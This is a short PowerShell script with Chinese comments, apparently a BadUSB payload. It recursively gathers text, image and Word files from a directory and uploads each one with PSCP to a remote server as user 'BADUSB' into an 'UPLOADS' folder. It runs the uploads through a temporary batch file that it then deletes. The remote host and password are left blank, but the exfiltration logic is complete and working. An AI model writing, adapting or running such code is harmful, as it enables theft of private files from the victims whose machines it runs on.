# 获取所有指定类型的文件
$fileTypes = @('*.txt', '*.jpg', '*.png', '*.doc', '*.docx')
$files = foreach ($fileType in $fileTypes) {
    Get-ChildItem -Path 'd:/test' -Recurse -Filter $fileType
}

# 设置用户名、密码和远程路径
$username = "BADUSB"
$password = "" # 远程仓库username的密码
$remoteHost = ""  # 远程仓库ip地址
$remoteDir = "/BADUSB/UPLOADS"
$scpPath = "D:\HACKER\PSCP.EXE"

# 创建临时批处理文件来执行scp命令
$tempBatchFile = [System.IO.Path]::GetTempFileName() + ".bat"
$batchContent = ""

foreach ($file in $files) {
    $localFile = $file.FullName
    $scpCommand = "`"$scpPath`" -pw `"$password`" `"$localFile`" ${username}@${remoteHost}:${remoteDir}"
    $batchContent += $scpCommand + "`r`n"
}

# 将批处理内容写入临时文件
Set-Content -Path $tempBatchFile -Value $batchContent

# 执行批处理文件
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempBatchFile`"" -NoNewWindow -Wait

# 删除临时批处理文件
Remove-Item -Path $tempBatchFile
